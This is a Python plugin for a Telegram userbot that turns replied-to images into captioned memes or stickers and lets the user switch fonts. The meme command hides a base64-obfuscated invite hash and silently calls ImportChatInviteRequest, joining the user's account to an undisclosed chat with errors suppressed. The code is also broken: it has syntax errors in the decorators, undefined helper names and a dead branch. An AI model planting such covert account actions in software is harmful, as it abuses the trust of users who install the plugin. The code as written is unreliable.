import asyncio
import base64
import os
import random

from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from . import (
    cat_meeme,
    cat_meme,
    convert_toimage,
    convert_tosticker,
)
from .sql_helper.globals import addgvar, gvarstatus

from userbot import CMD_HELP, TEMP_DOWNLOAD_DIRECTORY, bot
from userbot.events import register

def random_color():
    number_of_colors = 2
    return [
        "#" + "".join(random.choice("0123456789ABCDEF") for j in range(6))
        for i in range(number_of_colors)
    ]

FONTS = "1. `ProductSans-BoldItalic.ttf`\n2. `ProductSans-Light.ttf`\n3. `RoadRage-Regular.ttf`\n4. `digital.ttf`\n5. `impact.ttf`"
font_list = [
    "ProductSans-BoldItalic.ttf",
    "ProductSans-Light.ttf",
    "RoadRage-Regular.ttf",
    "digital.ttf",
    "impact.ttf",
]


@register(outgoing=True, pattern=r"(mmq|mmk) ?(.*)"))
async def memes(cat):
    if cat.fwd_from:
        return
    cmd = cat.pattern_match.group(1)
    catinput = cat.pattern_match.group(2)
    reply = await cat.get_reply_message()
    if not reply:
        return await edit_delete(cat, "`Reply to supported Media...`")
    catid = await reply_id(cat)
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if catinput:
        if ";" in catinput:
            top, bottom = catinput.split(";", 1)
        else:
            top = catinput
            bottom = ""
    else:
        return await edit_delete(
            cat, "`what should i write on that u idiot give text to memify`"
        )
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    output = await _cattools.media_to_pic(cat, reply)
    try:
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(output[1])
    meme = os.path.join("./temp", "catmeme.jpg")
    if gvarstatus("CNG_FONTS") is None:
        CNG_FONTS = "userbot/helpers/styles/impact.ttf"
    else:
        CNG_FONTS = gvarstatus("CNG_FONTS")
    if max(len(top), len(bottom)) < 21:
        await cat_meme(CNG_FONTS, top, bottom, meme_file, meme)
    else:
        await cat_meeme(top, bottom, CNG_FONTS, meme_file, meme)
    if cmd != "mmf":
        meme = convert_tosticker(meme)
    await cat.client.send_file(cat.chat_id, meme, reply_to=catid, force_document=False)
    await output[0].delete()
    for files in (meme, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@register(outgoing=True, pattern=r"cfont(?: |$)(.*)"))
async def lang(event):
    if event.fwd_from:
        return
    input_str = event.pattern_match.group(1)
    if not input_str:
        await event.edit(f"**Font Yang Tersedia Disini:-**\n\n{FONTS}")
        return
    if input_str not in font_list:
        catevent = await edit_or_reply(event, "`Berikan Format Nama Font Yang Benar...`")
        await asyncio.sleep(1)
        await catevent.edit(f"**Font Yang Tersedia Disini:-**\n\n{FONTS}")
    else:
        arg = f"userbot/helpers/styles/{input_str}"
        addgvar("CNG_FONTS", arg)
        await edit_or_reply(event, f"**Font Untuk Memify Diganti Ke :-** `{input_str}`")
        
CMD_HELP.update({
    "mimisan":
        "`.mmq` texttop ; textbottom\
        \nUsage: Balas pada sticker/image/gif dan kirim dengan command.\n"
        "`.mmk` texttop ; textbottom\
        \nUsage: Balas pada sticker/image/gif dan kirim dengan command.\n"
        "`.cfont`\
        \nUsage: Ganti Font Memify."
})
